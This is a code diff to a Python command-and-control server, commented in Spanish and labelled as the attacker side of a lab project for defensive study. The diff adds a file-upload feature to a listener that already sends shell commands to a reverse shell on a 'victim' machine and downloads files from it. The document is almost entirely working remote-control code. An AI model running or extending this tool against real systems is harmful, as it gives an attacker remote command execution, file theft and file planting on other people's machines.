@@ -1,5 +1,12 @@
 #!/usr/bin/env python3
-import socket, os
+# =============================================================================
+# C2 SERVER - LADO DEL ATACANTE (Command & Control)
+# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
+# ADVERTENCIA: Solo usar en laboratorio aislado propio
+# ENFOQUE: Transferencia de archivos de texto y configuración
+# =============================================================================
+
+import socket, os, time
 
 class Listener:
     def __init__(self, ip, port):
@@ -14,15 +21,50 @@ class Listener:
         conexion = self.connection.recv(1024)
         print(conexion.decode('utf-8', errors='ignore'))
         
-        # ← CREAR CARPETA DESCARGADOS
         if not os.path.exists("descargados"):
             os.makedirs("descargados")
         
+        if not os.path.exists("para_subir"):
+            os.makedirs("para_subir")
+            print("[+] Carpeta 'para_subir' creada para archivos a subir")
+        
     def ejecutarRemoto(self, command):
+        """
+        Envía comando al reverse shell y recibe respuesta
+        """
         self.connection.send(command.encode('utf-8'))
         return self.connection.recv(1024000)
     
+    def uploadRemoto(self, local_path, remote_path):
+        """
+        Envía archivos de texto/configuración a la víctima
+        """
+        try:
+            local_path = os.path.expanduser(local_path)
+            
+            with open(local_path, 'rb') as f:
+                contenido = f.read()
+            
+            file_size = len(contenido)
+            command = f"upload {remote_path} {file_size}"
+            self.connection.send(command.encode('utf-8'))
+            
+            ack = self.connection.recv(1024)
+            print(ack.decode('utf-8', errors='ignore').strip())
+            
+            time.sleep(0.1)
+            self.connection.sendall(contenido)
+            
+            confirmacion = self.connection.recv(1024)
+            return confirmacion.decode('utf-8', errors='ignore')
+        except Exception as e:
+            return f"[!] Error: {str(e)}"
+    
     def run(self):
+        """
+        Loop principal del C2
+        Comandos disponibles: cd, download, upload, execute, salir, + comandos nativos
+        """
         while True:
             command = input("shell »» ")
             
@@ -31,7 +73,6 @@ class Listener:
                 self.connection.close()
                 exit()
             
-            # ← NUEVO: DOWNLOAD (RECIBIR ARCHIVO)
             elif command.startswith("download "):
                 self.connection.send(command.encode('utf-8'))
                 
@@ -47,6 +88,15 @@ class Listener:
                     f.write(contenido)
                 
                 print(f"[+] Archivo guardado en: {ruta_guardado}")
+                continue
+            
+            elif command.startswith("upload "):
+                partes = command.split(" ", 2)
+                if len(partes) >= 3:
+                    local_path = partes[1]
+                    remote_path = partes[2]
+                    resultado = self.uploadRemoto(local_path, remote_path)
+                    print(resultado)
                 continue
             
             else:
